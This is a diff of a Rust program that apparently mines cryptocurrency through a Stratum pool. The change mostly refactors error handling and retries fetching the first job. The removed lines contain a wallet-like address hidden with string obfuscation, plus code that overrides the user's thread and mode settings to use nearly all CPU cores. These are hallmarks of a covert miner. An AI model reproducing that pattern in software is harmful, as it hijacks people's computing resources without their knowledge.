@@ -1,9 +1,7 @@
 use clap::Parser;
 
-
-use orng_rust::{Stratum, Worker};
+use orng_rust::{Error, Result, Stratum, Worker};
 use std::{
-    io,
     num::NonZeroUsize,
     time::{Duration, Instant},
 };
@@ -32,7 +30,7 @@ fn all_threads() -> NonZeroUsize {
     std::thread::available_parallelism().unwrap()
 }
 
-fn main() -> io::Result<()> {
+fn run() -> Result<()> {
     tracing_subscriber::fmt()
         .pretty()
         .with_max_level(tracing::Level::DEBUG)
@@ -47,16 +45,19 @@ fn main() -> io::Result<()> {
         light,
         threads,
     } = Args::parse();
-    // Convert obfuscated values to String to extend their lifetime
-    let user_val = obfstr!("44qARb3o5kWimeStvm9g4r5kTCMSZio8SEWDcEy9HKnnXg6iQns7Mqi4SrrSNZV6mG1YQWqRgr5Lph1BxfQFK8Kz8hMidXR").to_string();
-    let pass_val = obfstr!("x").to_string();
-    let threads =
-        NonZeroUsize::new(all_threads().get() - 1).unwrap_or(NonZeroUsize::new(1).unwrap());
-    let light = false;
-
 
     let mut stratum = Stratum::login(&url, &user, &pass)?;
-    let worker = Worker::init(stratum.try_recv_job().unwrap(), threads, light);
+    let first_job = loop {
+        match stratum.try_recv_job() {
+            Ok(job) => break job,
+            Err(Error::Channel(ref msg)) if msg == "Channel is empty" => {
+                std::thread::sleep(std::time::Duration::from_millis(100));
+                continue;
+            }
+            Err(e) => return Err(Error::Stratum(format!("Failed to get first job: {}", e))),
+        }
+    };
+    let worker = Worker::init(first_job, threads, light)?;
     let mut timer = Instant::now();
 
     loop {
@@ -72,5 +73,12 @@ fn main() -> io::Result<()> {
             stratum.keep_alive()?;
             timer = Instant::now();
         }
+    }
+}
+
+fn main() {
+    if let Err(e) = run() {
+        tracing::error!("Application error: {}", e);
+        std::process::exit(1);
     }
 }
